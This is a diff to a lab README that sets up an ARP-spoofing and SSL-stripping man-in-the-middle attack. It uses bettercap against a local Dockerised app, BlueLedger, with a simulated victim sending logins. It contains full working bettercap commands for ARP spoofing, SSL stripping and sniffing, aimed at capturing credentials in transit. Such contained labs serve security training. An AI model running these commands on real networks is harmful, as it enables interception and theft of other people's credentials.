@@ -26,12 +26,13 @@ sudo apt install bettercap
 ### 2. Enable IP Forwarding
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
-echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
+sudo sysctl -w net.ipv4.conf.all.send_redirects=0
 ```
 
 ### 3. Start SSL Stripping Attack
 
 **Basic command (replace `eth0` with your interface):**
+
 ```bash
 sudo bettercap -iface eth0 -eval "net.recon on; set arp.spoof.fullduplex true; arp.spoof on; set http.proxy.sslstrip true; http.proxy on; net.sniff on"
 ```
@@ -41,11 +42,23 @@ sudo bettercap -iface eth0 -eval "net.recon on; set arp.spoof.fullduplex true; a
 sudo bettercap -iface eth0 -eval "set arp.spoof.fullduplex true; set arp.spoof.targets [VICTIM_IP]; arp.spoof on; set http.proxy.sslstrip true; http.proxy on; net.sniff on"
 ```
 
-### 4. Run Victim Simulator
+### 4. Start BlueLedger Target Application
+```bash
+cd /home/hwoomer/Documents/BlueLedger
+docker compose up
+```
+
+This starts the BlueLedger app with:
+- HTTP server on port 5000
+- HTTPS server on port 5001 (with self-signed certificate)
+
+### 5. Run Victim Simulator
 In a separate terminal:
 ```bash
 python3 victim_simulator.py
 ```
+
+**Note**: Update victim simulator target to `https://[TARGET_IP]:5001/api/auth/login`
 
 ## Attack Components
 
@@ -71,10 +84,11 @@ Monitor bettercap output for POST data containing:
 - `csrf_token=dummy_token`
 
 ### Traffic Flow
-1. Victim attempts HTTPS connection to port 3000
+1. Victim attempts HTTPS connection to port 5001 (BlueLedger HTTPS)
 2. Bettercap intercepts and strips SSL
-3. Plaintext HTTP request sent to server
-4. Credentials captured in transit
+3. Plaintext HTTP request forwarded to port 5000 (BlueLedger HTTP)
+4. BlueLedger backend accepts both HTTP and HTTPS
+5. Credentials captured in transit by bettercap
 
 ## Victim Simulator Details
 - Sends login attempts every 30 seconds
